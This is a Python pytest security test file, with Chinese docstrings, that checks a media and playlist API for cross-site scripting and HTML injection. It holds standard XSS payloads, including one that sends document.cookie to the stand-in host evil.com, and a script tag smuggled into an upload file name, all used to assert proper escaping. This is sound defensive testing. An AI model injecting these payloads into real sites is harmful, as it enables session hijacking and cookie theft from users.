"""
安全测试 - XSS 攻击

测试跨站脚本攻击的防护
"""
import pytest


class TestXSS:
    """XSS 跨站脚本攻击测试"""

    @pytest.mark.security
    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "javascript:alert('xss')",
        "<body onload=alert('xss')>",
        "<iframe src='javascript:alert(1)'>",
        "<div onmouseover='alert(1)'>",
        "'\"><script>alert('xss')</script>",
        "<a href='javascript:alert(1)'>click</a>",
        "<input onfocus=alert(1) autofocus>",
    ])
    def test_register_xss_full_name(self, client, xss_payload):
        """测试注册时全名字段的 XSS"""
        response = client.post(
            "/api/auth/register",
            json={
                "username": "testuser_xss",
                "password": "password123",
                "full_name": xss_payload
            }
        )

        if response.status_code == 201:
            data = response.json()
            # 检查返回的数据是否被正确转义或清理
            full_name = data.get("full_name", "")
            assert "<script>" not in full_name.lower()
            assert "javascript:" not in full_name.lower()
            assert "onerror=" not in full_name.lower()
            assert "onload=" not in full_name.lower()

    @pytest.mark.security
    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
    ])
    def test_playlist_xss_name(self, client, auth_headers, xss_payload):
        """测试播放列表名称 XSS"""
        response = client.post(
            "/api/playlists/",
            json={
                "name": xss_payload,
                "description": "Test description"
            },
            headers=auth_headers
        )

        if response.status_code == 201:
            data = response.json()
            name = data.get("name", "")
            assert "<script>" not in name.lower()
            assert "onerror=" not in name.lower()

    @pytest.mark.security
    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
    ])
    def test_playlist_xss_description(self, client, auth_headers, xss_payload):
        """测试播放列表描述 XSS"""
        response = client.post(
            "/api/playlists/",
            json={
                "name": "Test Playlist",
                "description": xss_payload
            },
            headers=auth_headers
        )

        if response.status_code == 201:
            data = response.json()
            description = data.get("description", "")
            assert "<script>" not in description.lower()

    @pytest.mark.security
    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
    ])
    def test_device_xss_name(self, client, xss_payload):
        """测试设备名称 XSS"""
        import uuid
        response = client.post(
            "/api/devices/register",
            json={
                "device_id": str(uuid.uuid4()),
                "device_name": xss_payload
            }
        )

        if response.status_code in [200, 201]:
            data = response.json()
            device_name = data.get("device_name", "")
            assert "<script>" not in device_name.lower()

    @pytest.mark.security
    def test_user_profile_xss(self, client, test_user, auth_headers):
        """测试用户资料 XSS"""
        xss_payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"

        # 尝试更新用户资料
        response = client.put(
            f"/api/auth/users/{test_user.id}",
            json={"full_name": xss_payload},
            headers=auth_headers
        )

        if response.status_code == 200:
            data = response.json()
            assert "<script>" not in data.get("full_name", "").lower()


class TestHTMLInjection:
    """HTML 注入测试"""

    @pytest.mark.security
    @pytest.mark.parametrize("html_payload", [
        "<h1>Heading</h1>",
        "<a href='http://evil.com'>Link</a>",
        "<iframe src='http://evil.com'></iframe>",
        "<style>body{display:none}</style>",
        "<!-- comment -->",
    ])
    def test_html_injection_in_name(self, client, auth_headers, html_payload):
        """测试名称字段中的 HTML 注入"""
        response = client.post(
            "/api/playlists/",
            json={"name": html_payload},
            headers=auth_headers
        )

        if response.status_code == 201:
            # 应该转义或移除 HTML 标签
            data = response.json()
            name = data.get("name", "")
            # 检查 HTML 是否被转义（如 &lt;h1&gt;）或移除
            assert name != html_payload or "&lt;" in name or name.strip() == ""


class TestStoredXSS:
    """存储型 XSS 测试"""

    @pytest.mark.security
    def test_stored_xss_via_media_metadata(self, client, auth_headers):
        """测试通过媒体元数据的存储型 XSS"""
        xss_payload = "<script>alert('stored')</script>"

        response = client.post(
            "/api/media/upload",
            files={"file": (xss_payload + ".jpg", b"fake image", "image/jpeg")},
            headers=auth_headers
        )

        if response.status_code == 201:
            # 获取媒体列表，检查 XSS 是否被存储
            list_response = client.get("/api/media/", headers=auth_headers)
            if list_response.status_code == 200:
                items = list_response.json().get("items", [])
                for item in items:
                    file_name = item.get("file_name", "")
                    assert "<script>" not in file_name.lower()

    @pytest.mark.security
    def test_xss_in_api_response_content_type(self, client, auth_headers):
        """测试 API 响应中的 XSS"""
        # 创建带有特殊字符的播放列表
        response = client.post(
            "/api/playlists/",
            json={"name": "<script>alert(1)</script>", "description": "test"},
            headers=auth_headers
        )

        if response.status_code == 201:
            # 检查响应 Content-Type 是 JSON，不是 HTML
            assert "application/json" in response.headers.get("content-type", "")


class TestReflectedXSS:
    """反射型 XSS 测试"""

    @pytest.mark.security
    def test_reflected_xss_in_error_message(self, client):
        """测试错误消息中的反射型 XSS"""
        xss_payload = "<script>alert('reflected')</script>"

        # 尝试使用无效数据触发错误
        response = client.post(
            "/api/auth/register",
            json={"username": xss_payload, "password": "test"}
        )

        # 检查错误消息中是否包含未转义的 payload
        if response.status_code >= 400:
            body = response.text.lower()
            assert "<script>alert" not in body

    @pytest.mark.security
    @pytest.mark.parametrize("endpoint", [
        "/api/devices/",
        "/api/media/",
        "/api/playlists/",
    ])
    def test_search_query_xss(self, client, auth_headers, endpoint):
        """测试搜索查询中的 XSS"""
        xss_payload = "<script>alert('search')</script>"
        response = client.get(
            f"{endpoint}?search={xss_payload}",
            headers=auth_headers
        )

        if response.status_code == 200:
            # 检查响应中没有未转义的脚本
            body = response.text.lower()
            assert "<script>alert" not in body
